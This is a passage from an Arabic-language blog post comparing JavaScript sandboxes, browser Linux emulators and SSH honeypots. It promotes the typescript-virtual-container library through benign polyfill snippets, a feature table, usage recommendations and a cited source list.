دون Wasm ودون مكتبة polyfills خارجية ودون لجوء لـ`webpack-node-externals`. فقط وحدات مُسمَّاة وبعض الشموليات المحقونة. دعني أفصّل كلا لأن بعضها مثير للإعجاب فعلا.

**`node:fs`، IndexedDB كنظام ملفات زائف**

هذا هو المفضل لدي. ينفذ polyfill الخاص بـ`node:fs` واجهة Node.js المتزامنة لـfs (`readFileSync` و`writeFileSync` و`existsSync` و`readdirSync` و`mkdirSync` و`unlinkSync` و`statSync`...) مدعومة بطبقتين : `Map` في الذاكرة للقراءات المتزامنة، وIndexedDB للثبات بين إعادة تحميل الصفحة. تذهب الكتابات للـMap فورا (فيعمل `readFileSync` بعد `writeFileSync` مباشرة دائما)، ثم تُفرَّغ نحو IndexedDB بشكل غير متزامن في الخلفية.

```js
// كاش متزامن (مسار ← Uint8Array | null)، قراءات فورية
const memCache = new Map();

// حمّل الكل مسبقا من IndexedDB إلى memCache عند الإقلاع
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

وهذا هو سبب نجاة لقطة VFS من إعادة تحميل الصفحة في المتصفح، فثنائي `.vfsb` كامل مكتوب في IndexedDB عبر هذا polyfill، ويُقرأ عند التحميل التالي. دون Wasm ودون خادم. فقط IndexedDB، الموجودة في كل المتصفحات منذ 2011.

**`node:crypto`، SHA-256 في JS خالص**

بدلا من استيراد مكتبة تشفير Wasm، ينفذ polyfill التشفير SHA-256 من الصفر باستخدام ثوابت الجولات في FIPS 180-4. 166 سطرا من JS خالص مع دعم كامل لمخرجات hex/base64/Uint8Array. كل تجزئة في المكتبة تمر من هنا، بصمة مفاتيح مضيف SSH ومجاميع فحص داخلية وكل شيء. مدمج وصفر تبعية ويعمل.

**`node:os`، يقرأ عتاد المتصفح الحقيقي**

هذه لمسة لطيفة. بدلا من إعادة قيم وهمية مُرمَّزة صلبا، يقرأ `node:os` خاصية `navigator.deviceMemory` لإجمالي RAM و`navigator.hardwareConcurrency` لعدد CPU. فيعرض `neofetch` في بناء المتصفح فعلا شيئا يطابق آلتك الحقيقية، لا stub زائف `نواتان و2 Go ذاكرة`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 Go افتراضيا
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // يحلل أيضا navigator.userAgent لتخمين سلسلة طراز CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net` و`ssh2` و`roxify`، بدائل صادقة**

لا يستطيع المتصفح فتح sockets TCP ولا تنفيذ SSH حقيقي، فهذه بدائل ترمي خطأ `NotImplemented` برسالة واضحة إذا حاول شيء استخدامها. تبقى الإخفاقات صريحة، دون `undefined` مُعاد حيث يُتوقَّع كائن. فقط رسالة قوية وواضحة "هذا لا يعمل في المتصفح"، وهذا بالضبط ما تريده.

**`process.js` و`buffer.js`، شموليات محقونة**

يُحقَن هذان في أعلى كل ملف من الحزمة عبر خيار `inject` في esbuild، فيتاح `process` و`Buffer` شموليا دون أي استيراد صريح. `process.js` ضئيل : `env` و`version` و`platform: 'browser'` و`nextTick` عبر `queueMicrotask` و`uptime` عبر `performance.now()`. `buffer.js` إعادة تنفيذ كاملة لـ`Buffer` فوق `Uint8Array`، كل طرق `readUInt32BE` و`writeInt16LE` وترميزات hex/base64 التي يعتمد عليها تنفيذ SSH وVFS.

---

مجموعة polyfills كلها حوالي 640 سطرا من JS مكتوب باليد إجمالا. دون حزم npm ودون Wasm. والنتيجة حزمة متصفح هي فقط المكتبة، تعمل أصليا، دون أي من قلق "لكن هل يعمل فعلا في المتصفح ؟" المعتاد الذي تحصل عليه مع المكتبات المصممة لـNode أولا. يجدر إلقاء نظرة على مجلد `polyfills/` في المستودع إذا كنت فضوليا، فكل ملف محتوى جيدا ومقروء وحده، وهذا خيار أسلوب أقدّره كثيرا.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **الفئة** | عزل JS | عزل JS | عزل JS | محاكي | محاكي | Node.js/Wasm | Honeypot | محاكي سلوكي |
| **يعزل JS** | ⚠️ نطاق | ✅ V8 Isolate | ✅ Wasm | لا ينطبق | لا ينطبق | جزئي | لا ينطبق | ✅ Worker |
| **نواة Linux حقيقية** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **مفسّر shell** | ❌ | ❌ | ❌ | ✅ (حقيقي) | ✅ (حقيقي) | ✅ (حقيقي) | جزئي | ✅ (مخصص) |
| **~170 أمر Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | جزئي | ~20 | ✅ |
| **أذونات POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | جزئي | ✅ مطبقة |
| **إدارة مستخدمين** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | دنيا | ✅ كاملة |
| **خادم SSH حقيقي** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/تدقيق** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **فرق/لقطة VFS** | ❌ | ❌ | ❌ | محدود | ❌ | ❌ | ❌ | ✅ |
| **شبكة افتراضية L2/L3** | ❌ | ❌ | ❌ | أساسي | ❌ | ❌ | ❌ | ✅ كاملة |
| **VPN افتراضي** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **دعم متصفح** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js أصلي** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **واجهة مُنمَّطة** | أساسية | ✅ | ✅ | دنيا | ❌ | ✅ | ❌ | ✅ كاملة |
| **توافق ثنائي** | لا ينطبق | لا ينطبق | لا ينطبق | ✅ | ✅ | جزئي | لا ينطبق | ❌ |
| **زمن الإقلاع** | فوري | فوري | فوري | 15-40s | 15-40s | 2-5s | فوري | <1s |
| **RAM/نسخة** | ~1 Mo | ~3-10 Mo | ~5-15 Mo | 150-256 Mo | 200+ Mo | ~100 Mo | ~50 Mo | ~5-20 Mo |
| **تبعيات runtime** | 0 | 1 (أصلية) | 1 (Wasm) | 0 | ملكية | 1 | تبعيات Python | 3 (ssh2 وws وfflate) |
| **الحالة** | مستقر | ✅ نشط | ✅ نشط | ✅ نشط جدا | تجاري | ✅ نشط | ✅ نشط | ✅ نشط |

---

## متى تستخدم ماذا

**يجب أن تنفذ JavaScript غير موثوق، صيغة مقدمة من مستخدم أو إضافة أو خطاف سكربت.**
← `isolated-vm`. عزل V8 حقيقي وحدود ذاكرة صارمة وجسر تواصل صريح. تجنب `vm2`، فقائمة CVE لا تطول إلا، جديا إنها واحدة جديدة كل بضعة أشهر. تجنب `vm`، فليس عزلا إطلاقا، من فضلك.

**يجب أن تعزل JS ولا تريد امتدادا أصليا، أو تحتاج توافق متصفح.**
← `quickjs-emscripten`. حد Wasm ووحدة حوالي 500 Ko وتعمل في المتصفحات وNode. أبطأ من V8 لكن معزولة فعلا.

**يجب أن تقلع OS حقيقي في Linux غير معدل مع توافق ثنائي.**
← `v86` لـLinux بنظام 32-bit، أو `container2wasm` إذا كانت لديك صورة Docker موجودة. اقبل 150 Mo+ ذاكرة و30 ثانية إقلاع، هذا هو الاتفاق. إذا احتجت 64-bit، انظر CheerpX أو استخدم فقط runtime حاوية حقيقي.

**يجب أن تدمج طرفية من نوع Linux في تطبيق ويب دون خلفية.**
← `v86` (نظام كامل وثقيل وبطيء الإقلاع) أو حزمة متصفح `typescript-virtual-container` (محاكي سلوكي وأخف وإقلاع فوري، وتتضمن `startxfce4` لمكتب كامل وهذا رائع فعلا).

**تحتاج دروس برمجة تفاعلية على الإنترنت أو IDE متصفح.**
← WebContainers إذا كنت متمركزا على نظام Node.js البيئي. CheerpX إذا احتجت userspace حقيقي في Linux. حزمة متصفح `typescript-virtual-container` إذا أردت خيارا أخف مع واجهة مُنمَّطة.

**تريد جمع TTP مهاجمي SSH على نطاق واسع.**
← Cowrie هو معيار الإنتاج، نقطة نهائية. يعمل على أي خادم Linux، ويتكامل مع كل SIEM، ولديه وضع LLM الآن. استخدم Cowrie فقط.

**تريد بيانات honeypot SSH في تطبيق Node.js مع واجهة قابلة للبرمجة.**
← `typescript-virtual-container`. تُنفَّذ الأوامر فعلا. VFS بنية بيانات حقيقية تستطيع التقاطها وتمييزها فورا. يحصل المهاجم على بيئة تفاعلية مقنعة، وتحصل على بيانات تدقيق منظمة دون مغادرة Node.

**تحتاج أتمتة shell / اختبارات في CI دون Docker.**
← `typescript-virtual-container`. يقلع في أقل من ثانية، والتقط قبل اختبار، واستعد بعده. نفّذ أوامر shell مع واجهة مُنمَّطة. دون daemon في Docker ودون نواة ودون VM ودون انتظار.

**تحتاج بيئات shell متعددة المستأجرين (SaaS وتعليم وتدريب).**
← `typescript-virtual-container`. 5-20 Mo لكل نسخة ضد 150-256 Mo لمحاكي. 100 مستخدم متزامن : ~2 Go ضد ~25 Go. إنه فرق كبير في kost الاستضافة !

**تحتاج honeypot واقعيا يسمح لك أيضا ببناء مختبر شبكة متعدد VM.**
← `typescript-virtual-container` هو الشيء الوحيد في هذا الفضاء الذي يفعل الاثنين.

---

## ما لا يستطيع فعله (وأريد الصدق في ذلك)

لا يستطيع تنفيذ ثنائيات x86 أصلية. إذا احتجت ترجمة كود C أو تنفيذ مفسّر Python حقيقي أو استخدام برمجيات مُجمَّعة لـLinux، فلا ABI نواة لدعم استدعاءات النظام تلك. أوامر مثل `gcc` و`python3` و`node` هي stubs، ترد على `--version` والاستدعاءات الشائعة، لكنها لا تنفذ شيئا حقيقيا.

إنها المقايضة الجوهرية : تكسب ذاكرة أقل 10 إلى 50 مرة وإقلاعا فوريا وتوافق متصفح وواجهة مُنمَّطة وSSH حقيقي وشبكة افتراضية، وتتخلى عن التوافق الثنائي مع userspace في Linux.

فكرت Fortune كثيرا في ذلك عند تصميم المشروع. لحالات الاستخدام التي استهدفتها، honeypots واختبارات وطرفيات مضمنة وبيئات CI، تنفيذ ثنائي مُجمَّع ليس ضروريا فعلا أبدا. تغطي خطوط shell ومعالجة الملفات وتوجيه الشبكة وSSH كل شيء. لكن إذا تطلبت حالتك برمجيات مُجمَّعة حقيقية، فـ`v86` أو Docker هو الجواب الصحيح، لا هذا.

---

## للختم

إذن ها هو. هذا النظام البيئي أوسع وأكثر تجزؤا مما يبدو من الخارج. `vm` فاصل نطاق، لا عزل. تُواصِل `vm2` مراكمة CVE (فعلا، انظر تنبيهات هذا الشهر). `isolated-vm` هو الجواب الصحيح لعزل JS لكن JS فقط. `quickjs-emscripten` هو الخيار الصحيح عندما تحتاج توافق متصفح أو تريد تجنب الامتدادات الأصلية. `v86` وCheerpX محاكيان حقيقيان عندما تحتاج توافقا ثنائيا حقيقيا. WebContainers هي Node.js في Wasm، لا بيئة Linux عامة. Cowrie هو المعيار الذهبي لـhoneypots SSH، لكنه Python وليس Node أصليا.

ثم هناك `typescript-virtual-container`، مشروع Fortune، الذي يعيش في فئته الخاصة بعض الشيء. لا محاكي ولا عزل JS ولا honeypot سلبي. شيء بين الكل أثبت فائدته المدهشة لأشياء كثيرة لا يستطيع أي من الآخرين فعلها.

يسد `typescript-virtual-container` الفجوة التي لا يلمسها أي من الآخرين : بيئة shell كاملة في Linux وقابلة للبرمجة مع SSH حقيقي وSFTP وأذونات POSIX وإدارة مستخدمين وشبكة افتراضية وواجهة TypeScript مُنمَّطة، تعمل في حوالي 10 Mo، وتقلع في أقل من ثانية، وتعمل في Node.js والمتصفح معا.

إذا أردت تجربته : الكود المصدري على [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) وهناك عرض على الإنترنت (يتضمن `startxfce4` لمكتب كامل، وهذا مريض فعلا) على [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). ألقِ نظرة واترك بعض نجوم لـFortune على GitHub، إنها تستحقها !

شكرا على القراءة، كان هذا طويلا حتى بمعاييري :) آمل أنه كان مفيدا لك !

---

## المصادر

حاولت ربط كل ادعاء بمصدر أولي، تنبيهات CVE ووثائق رسمية ومستودعات GitHub ومقالات مدونة المشرفين. بعض الملاحظات : قائمة CVE الخاصة بـvm2 تستمر في الطول لذا قد يكون رابط FortiGuard عتيقا لحظة قراءتك هذا (انظر صفحة تنبيهات GitHub للأحدث). روابط Bellard كلها مستقرة، فموقعه الشخصي موجود دائما والمحتوى لا يتغير. وإذا أردت تعميق أحد polyfills، يكفي تصفح مجلد `polyfills/` في مستودع `typescript-virtual-container` مباشرة، فهو أقرأ من أي وصف قد أكتبه هنا.

### عزل JavaScript

- **وحدة `vm` في Node.js**، التوثيق الرسمي : [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **تحذير أمان `vm` في Node.js**، "وحدة vm ليست آلية أمان. لا تستخدموها لتنفيذ كود غير موثوق" : [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`**، npm : [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub : [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **التسلسل الزمني لـCVE في vm2**، تنبيه FortiGuard مع قائمة CVE الكاملة والتواريخ : [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017**، هروب عبر خطأ async، GHSA : [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314**، Proxy + Error.name + هروب Function، gist PoC : [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466**، مدخل Exploit DB مع PoC كامل : [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE في vm2 لعام 2026**، 11 هروبا جديدا، تحليل : [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer : [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"**، تشريح ما بعد الحادث من oxeye.io حول CVE-2022-36067 : [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`**، npm : [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub : [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **داخليات V8 Isolate**، دليل التضمين : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`**، npm : [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub : [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`**، npm : [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub : [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **محرك QuickJS**، من Fabrice Bellard : [bellard.org/quickjs](https://bellard.org/quickjs/)
- **نموذج أذونات Deno**، وثائق : [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **إصدار Deno 2**، أكتوبر 2024 : [deno.com/blog/v2](https://deno.com/blog/v2)
- **اقتراح TC39 ShadowRealm**، [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **اقتراح TC39 Compartments**، [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"**، مقال عملي من Andrew Healey عن مقاربة عزل Deno : [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### محاكيات Linux

- **`v86`**، npm : [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub : [github.com/copy/v86](https://github.com/copy/v86) · عرض : [copy.sh/v86](https://copy.sh/v86)
- **مصفوفة دعم OS في v86**، [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS المستخدم من v86)، [seabios.org](https://www.seabios.org/SeaBIOS)
- **امتدادات Bochs VBE** (مرجع VGA)، [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux**، محاكي Bellard : [bellard.org/jslinux](https://bellard.org/jslinux/) · ملاحظات تقنية (TinyEMU والتاريخ وasm.js←Wasm) : [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU**، مصدر C : [bellard.org/tinyemu](https://bellard.org/tinyemu/) · مرايا GitHub غير رسمية : [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k**، محاكي JS الخاص بـOpenRISC : [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · عرض : [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX**، وثائق : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · دليل pthreads : [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers**، npm : [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · وثائق API : [webcontainers.io](https://webcontainers.io) · إعلان : [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · نظرة InfoQ : [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm**، GitHub : [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · مقال مدونة NTT : [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · مقال Simon Willison : [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### حزمة الطرفية

- **xterm.js**، npm : [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub : [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · موقع : [xtermjs.org](https://xtermjs.org)
- **node-pty**، npm : [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft) : [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypots

- **Cowrie**، GitHub : [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · وثائق : [docs.cowrie.org](https://docs.cowrie.org) · موقع : [cowrie.org](https://www.cowrie.org/)
- **Kippo**، GitHub (مؤرشف) : [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh**، GitHub : [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame**، GitHub : [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird**، Docker Hub : [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot**، Honeypot SSH دنيا في Node.js : [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots**، قائمة منظمة : [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082**، اكتشاف معلومات نظام (كيف يكشف المهاجمون honeypots) : [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm** : [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub** : [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **عرض على الإنترنت** : [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **دليل البنية** : [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (تنفيذ بروتوكول SSH)، npm : [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub : [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (ضغط لقطات VFS)، npm : [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (نقل shell عبر WebSocket)، npm : [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### قراءات إضافية

- **نموذج أذونات POSIX**، مواصفة Open Group : [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **تسجيل الكتابة المسبقة** (النمط المستخدم في ثبات VFS)، [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **نموذج V8 Isolate**، "دليل المضمّن" : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **مواصفة ISA الخاصة بـRISC-V** (لسياق TinyEMU/JSLinux)، [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **بنية OpenRISC 1000**، [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"**، Simon Willison TIL، تباين مفيد مع مقاربة Wasm : [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"**، Simon Willison TIL عن حجم حزمة quickjs-emscripten : [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
